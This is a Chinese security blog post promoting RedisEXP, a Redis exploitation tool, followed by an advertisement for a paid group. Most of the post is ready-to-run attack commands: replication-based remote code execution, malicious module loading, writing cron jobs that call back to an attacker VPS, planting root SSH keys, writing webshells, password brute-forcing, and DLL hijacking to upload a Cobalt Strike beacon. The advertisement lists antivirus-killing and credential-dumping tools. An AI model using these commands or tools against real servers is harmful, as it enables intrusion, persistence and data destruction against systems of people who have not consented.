#  工具推荐 | Redis 漏洞综合利用工具   
yuyan-sec  星落安全团队   2025-01-23 16:00  
  
![](https://mmbiz.qpic.cn/mmbiz_png/spc4mP9cfo75FXwfFhKxbGU93Z4H0tgt4O9libYH9mKfZdHgvke0CeibvXDtNcdaqamRk3dEEcRQiaWbGiacZ2waVw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WN0ZdfFXY80dA2Z4y8cq7zy2dicHmWOIib5sIn8xAxRIzJibo2fwVZ3aicVBM8RnAqRPH5Libr4f02Zs5YnMLBcREnA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
现在只对常读和星标的公众号才展示大图推送，建议大家能把  
**星落安全团队**  
“  
**设为星标**  
”，  
否则可能就看不到了啦  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rlSBJ0flllkXnsUODwVWmlxAHuHu4dBuwIlu707ZfPdbNTYyibYzQHA0xn0p2hTbQAiba04SOnDiadxVExZ53nfog/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**工具介绍**  
  
**RedisEXP是一款golang编写的Redis漏洞利用工具。注意：主从复制会清空数据，主从复制会清空数据，主从复制会清空数据，请注意使用！请注意使用！请注意使用！**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rlSBJ0fllllkWS8LOfba6icHpZ3EEhibvzNia8hc2klgL7OpktSH8O48lpAtKwr5rCu4awPBzuN03bACqcib2f5IfA/640?wx_fmt=png&from=appmsg "")  
  
  
**工具使用**  
```

██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗
██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝
██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝

基本连接: 
RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456

执行Redis命令：
RedisExp.exe -m cli -r 192.168.19.1 -p 6379 -w 123456 -c info

加载dll或so执行命令：
RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf (目标 dll | so 文件名)
RedisEXP.exe -m load -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec

主从复制命令执行：
RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami -rf exp.so

主从复制上传文件：
RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件
RedisEXP.exe -m upload -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -rp . -rf 1.txt -lf .\README.md

主动关闭主从复制：
RedisExp.exe -m close -r 目标IP -p 目标端口 -w 密码

写计划任务：
RedisExp.exe -m cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort
RedisEXP.exe -m cron -r 192.168.1.8 -p 6379 -L 192.168.1.8 -P 9001

写SSH 公钥：
RedisExp.exe -m ssh -r 目标IP -p 目标端口 -w 密码 -u 用户名 -s 公钥
RedisEXP.exe -m ssh -r 192.168.1.8 -p 6379 -u root -s ssh-aaaaaaaaaaaaaa

写webshell：
RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容 [base64内容使用 -b 来解码]
RedisEXP.exe -m shell -r 127.0.0.1 -p 6379 -rp . -rf shell.txt -s MTIzNA== -b

CVE-2022-0543：
RedisExp.exe -m cve -r 目标IP -p 目标端口 -w 密码 -c 执行命令

爆破Redis密码：
RedisExp.exe -m brute -r 目标IP -p 目标端口 -f 密码字典
RedisEXP.exe -m brute -r 127.0.0.1 -p 6378 -f pass.txt

生成gohper：
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件

执行 bgsave：
RedisExp.exe -m bgsave -r 目标IP -p 目标端口 -w 密码

判断文件（需要绝对路径）：
RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf c:\windows\win.ini

```  
- exp.dll 和 exp.so 来自   
https://github.com/0671/RabR  
 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。  
  
- 在写入webshell的时候因为有一些特殊字符，可以使用把webshell进行 base64 编码，然后使用 -b 参数来解码  
  
- 有空格的命令、目录或文件直接使用双引号即可 "ls /"  
  
- 关闭Redis压缩(写入乱码的时候可以关闭压缩，工具在写入shell的时候默认添加了关闭压缩，写入后再恢复开启压缩)  
```
config set rdbcompression no
```  
  
-   
- stop-writes-on-bgsave-error 默认为 yes, 如果 Redis 开启了 RDB 持久化并且最后一次失败了，Redis 默认会停止写入，让用户意识到数据的持久化没有正常工作。临时的解决方案是 conf set stop-writes-on-bgsave-error 设置为 no，只是让程序暂时忽略了这个问题，但是数据的持久化的问题并没有。（工具会默认设置为 no，等工具退出的时候再重新设置回原来的值yes）  
```
config set stop-writes-on-bgsave-error no
```  
  
-   
dll劫持   
```
上传 cs 马
.\RedisEXP.exe -m upload -r 127.0.0.1 -p 6378 -w 123456 -L 127.0.0.1 -P 2222 -rp c:\users\public -rf test.exe  -lf artifact.exe

上传 dbghelp.dll 到 redis-server.exe 所在目录进行劫持
.\RedisEXP.exe -m upload -r 127.0.0.1 -p 6378 -w 123456 -L 127.0.0.1 -P 2222 -rp . -rf dbghelp.dll  -lf dbghelp.dll

触发dll劫持
.\RedisEXP.exe -m bgsave -r 127.0.0.1 -p 6378 -w 123456
```  
  
生成gohper  
```
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件
```  
  
写shell模板  
```
config set dir /tmp
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
bgsave
```  
  
报错  
```
工具报错：[ERR Error loading the extension. Please check the server logs.]        module load /tmp/exp.so

服务端报错：Module /tmp/exp.so failed to load: It does not have execute permissions.
```  
  
有可能是 Redis 版本太高， exp.so 没有执行权限导致加载不了。具体需要查看服务端的报错  
  
  
**下载地址**  
  
**关注微信公众号后台回复“入群”，即可进入星落安全交流群！**  
  
关注微信公众号后台回复“  
20250124  
**”，即可获取项目下载地址！**  
  
  
  
**圈子介绍**  
  
博主介绍  
：  
  
  
目前工作在某安全公司攻防实验室，一线攻击队选手。自2022-2024年总计参加过30+次省/市级攻防演练，擅长工具开发、免杀、代码审计、信息收集、内网渗透等安全技术。  
  
  
目前已经更新的免杀内容：  
- 部分免杀项目源代码  
  
- 一键击溃360+核晶  
  
- 一键击溃windows defender  
  
- 一键击溃火绒进程  
  
-    
CobaltStrike4.9.1二开   
  
-    
CobaltStrike免杀加载器  
  
- 数据库直连工具免杀版  
  
- aspx文件自动上线cobaltbrike  
  
- jsp文件  
自动上线cobaltbrike  
  
- 哥斯拉免杀工具   
XlByPassGodzilla  
  
- 冰蝎免杀工具 XlByPassBehinder  
  
- 冰蝎星落专版 xlbehinder  
  
- 正向代理工具 xleoreg  
  
- 反向代理工具xlfrc  
  
- 内网扫描工具 xlscan  
  
- CS免杀加载器 xlbpcs  
  
- Todesk/向日葵密码读取工具  
  
- 导出lsass内存工具 xlrls  
  
- 绕过WAF免杀工具 ByPassWAF  
  
- 等等...  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DWntM1sE7icZvkNdicBYEs6uicWp0yXACpt25KZIiciaY7ceKVwuzibYLSoup8ib3Aghm4KviaLyknWsYwTHv3euItxyCQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
目前星球已满300人，价格由208元  
调整为  
218元(  
交个朋友啦  
)，400名以后涨价至268元！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rlSBJ0fllln6UAjFy3qnia9VZT7cM3xAhOXPfsD9PAxeKjKd8wEsV6sFpSYzY6IvE5m4vFRIl9QTGtKwibY6KZNw/640?wx_fmt=jpeg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MuoJjD4x9x3siaaGcOb598S56dSGAkNBwpF7IKjfj1vFmfagbF6iaiceKY4RGibdwBzJyeLS59NlowRF39EPwSCbeQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
     
往期推荐  
     
  
  
  
1.[【免杀】ASPX文件加载shellcode实现CobaltStrike上线](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247488563&idx=1&sn=1f358db06abaf7a4036129d33682dfcc&chksm=c0e2bf8cf795369ac5f5869225cd00ab4aee59e14549692a8711955c0c2f334f1651aa78e64c&scene=21#wechat_redirect)  
  
  
  
[2.](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247488563&idx=1&sn=1f358db06abaf7a4036129d33682dfcc&chksm=c0e2bf8cf795369ac5f5869225cd00ab4aee59e14549692a8711955c0c2f334f1651aa78e64c&scene=21#wechat_redirect)  
[【干货】你不得不学习的内网渗透手法](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247489483&idx=1&sn=0cbeb449e56db1ae48abfb924ffd0b43&chksm=c0e2bc74f79535622f39166c8ed17d5fe5a2bbc3f622d20491033b6aa61d26d789e59bab5b79&scene=21#wechat_redirect)  
  
  
  
3[.](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247485372&idx=1&sn=6041af855d6e16485e04a7187b0db2c9&chksm=c0e2ac03f7952515162a4751f3d12bc61c2bd0e9fc80cb095e866bea7eb74f6b83da138e6af1&scene=21#wechat_redirect)  
[【免杀】基于fscan 过360核晶、火绒的xlscan v1.2 介绍！](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247489194&idx=1&sn=4528f9a1c042b024136837ba2d53171f&chksm=c0e2bd15f7953403e0acd02a97605ef911fc8f49e86cb4f2c1bddd779450e32ac6a1cc7adc9d&scene=21#wechat_redirect)  
  
  
  
4[.](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247485412&idx=1&sn=43f7ccd9e5da3e293faac9def1f07458&chksm=c0e2ac5bf795254df7a82a677fc5792c62829442adc24239fdb6208ec36e8450e81c617bde70&scene=21#wechat_redirect)  
[【免杀】CobaltStrike4.9.1二开 | 自破解 免杀 修复BUG](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247488486&idx=1&sn=683083d38a58de4a95750673d9cb725d&chksm=c0e2b859f795314f3b7bc980a5d4114508ee2c286bc683cdfd25eefa4fb59f26adfe5483690b&scene=21#wechat_redirect)  
[！](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247486966&idx=1&sn=3f144d5936d5cdc11178004549384ace&chksm=c0e2a649f7952f5f7557dde6e9cca53ecee7b5e2f7ff23395250e8fe47acb102902d9727185d&scene=21#wechat_redirect)  
  
  
  
5. [【免杀】原来SQL注入也可以绕过杀软执行shellcode上线CoblatStrike](http://mp.weixin.qq.com/s?__biz=MzkwNjczOTQwOA==&mid=2247489950&idx=1&sn=a54e05e31a2970950ad47800606c80ff&chksm=c0e2b221f7953b37b5d7b1a8e259a440c1ee7127d535b2c24a5c6c2f2e773ac2a4df43a55696&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DWntM1sE7icZvkNdicBYEs6uicWp0yXACpt25KZIiciaY7ceKVwuzibYLSoup8ib3Aghm4KviaLyknWsYwTHv3euItxyCQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
【  
声明  
】本文所涉及的技术、思路和工具仅用于安全测试和防御研究，切勿将其用于非法入侵或攻击他人系统以及盈利等目的，一切后果由操作者自行承担！！！  
  
